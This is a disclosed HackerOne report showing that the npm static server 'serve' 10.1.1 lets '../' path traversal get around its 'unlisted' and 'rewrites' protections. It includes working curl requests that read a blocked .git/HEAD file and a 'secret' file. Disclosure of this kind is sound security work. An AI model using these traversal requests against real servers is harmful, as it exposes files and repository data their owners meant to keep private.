# [serve] Access unlisted internal files/folders revealing sensitive information

## Report Details
- **Report ID**: 486933
- **URL**: https://hackerone.com/reports/486933
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2019-01-27T15:55:48.066Z
- **Disclosed**: 2019-02-07T21:22:35.524Z

## Reporter
- **Username**: skyn3t
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report sensitive information disclosure in serve.
Bypass of #308721 in ways.

# Module

**module name:** serve
**version:** 10.1.1
**npm page:** `https://www.npmjs.com/package/serve

## Module Description

Assuming you would like to serve a static site, single page application or just a static file (no matter if on your device or on the local network), this package is just the right choice for you.

It behaves exactly like static deployments on Now, so it's perfect for developing your static project. Then, when it's time to push it into production, you deploy it.

Furthermore, it provides a neat interface for listing the directory's contents

## Module Stats

**weekly downloads**
138,377

# Vulnerability

## Vulnerability Description

The `serve` modules allows directory browsing and to serve static files through the browser.
The config options `unlisted` and `rewrites` can be used to tell the module which file or directory are forbidden and should not be served. 
refer: https://github.com/zeit/serve-handler/issues/48
This rule can be bypassed using the technique below which can lead to sensitive information disclosure (An interesting example: https://smitka.me/).

## Steps To Reproduce:

- Install `serve`
```
$ npm install -g serve
```

- Inside a project directory, initialise `git` and create `404.html`.
```
$ git init
$ echo "404 Not Found" > 404.html
$ echo "secret text" > secret
```

- Add rule to ignore `.git` folder in `serve.json`
```json
{
    "rewrites": [
        { "source": ".git/**", "destination": "/404.html" },
        { "source": "secret", "destination": "/404.html" }
      ],
    "unlisted": [
      ".git"
    ]
  }
```

- Start `serve` in current directory.

```
$ serve
INFO: Discovered configuration in `serve.json`
   ┌───────────────────────────────────────────────┐
   │                                               │
   │   Serving!                                    │
   │                                               │
   │   - Local:            http://localhost:5000   │
   │   - On Your Network:  http://127.0.1.1:5000   │
   │                                               │
   │   Copied local address to clipboard!          │
   │                                               │
   └───────────────────────────────────────────────┘
```

- Now, current directory will be served by `serve` with the exception of folder `.git` and file `secret`.
- If we try to curl `.git`or `secret` we get a Not Found error
```
$ curl http://localhost:5000/.git --path-as-is     
404 Not Found
$ curl http://localhost:5000/secret --path-as-is
404 Not Found
```

- Although if we request any other url and then navigate back to the forbidden files/folders using `../` scheme, we are able to extract it's contents successfully.
```
$ curl http://localhost:5000/any/../.git/HEAD --path-as-is
ref: refs/heads/master
$ curl http://localhost:5000/any/../secret --path-as-is   
secret text
```


## Supporting Material/References:

- Ubuntu 16.04
- node v11.3.0
- npm 6.7.0

# Wrap up



- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

The essentially bypasses the `unlisted` and `rewrites` files/folders feature and allows an attacker to read from a directory/file that the victim has not allowed access to.

**References:**
- https://github.com/zeit/serve-handler#options
- https://github.com/zeit/serve-handler/issues/48

## Attachments
No attachments
